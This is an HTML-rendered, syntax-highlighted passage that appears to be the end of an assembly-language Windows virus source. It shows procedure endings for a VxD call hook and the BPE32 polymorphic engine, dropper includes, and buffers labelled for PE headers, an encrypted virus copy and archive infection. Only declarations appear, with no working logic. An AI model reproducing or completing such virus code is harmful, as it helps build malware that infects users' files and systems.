</span><span class="sc5">BPE32</span><span class="sc0">     </span><span class="sc9">EndP</span><span class="sc0">          </span><span class="sc1">;BPE32 ends here</span><span class="sc0">
</span><span class="sc5">VxDCall_hook</span><span class="sc0">    </span><span class="sc9">EndP</span><span class="sc0">


</span><span class="sc5">d1start</span><span class="sc4">:</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">drop1.inc</span><span class="sc0">
</span><span class="sc5">d1size</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">d1start</span><span class="sc0">

</span><span class="sc5">d2start</span><span class="sc4">:</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">drop2.inc</span><span class="sc0">
</span><span class="sc5">d2size</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">d2start</span><span class="sc0">


</span><span class="sc5">virus_end</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">VxDCall0</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">VxDCall_addr</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">6</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">targetname</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">MAX_PATH</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">tmpname</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">header</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">4</span><span class="sc4">+</span><span class="sc5">IMAGE_SIZEOF_FILE_HEADER</span><span class="sc0"> \
            </span><span class="sc4">+</span><span class="sc5">IMAGE_SIZEOF_NT_OPTIONAL_HEADER</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">section_header</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">IMAGE_SIZEOF_SECTION_HEADER</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">512</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">threadstack</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">virus_in_arc</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">3000h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">crypted_virus</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">2000h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">size_unint</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">virus_end</span><span class="sc0">


</span><span class="sc5">workspace1</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">16</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">workspace2</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">16</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc9">ends</span><span class="sc0">
</span><span class="sc9">End</span><span class="sc0"> </span><span class="sc5">first_gen</span><span class="sc0">
</span></div></body>
</html>
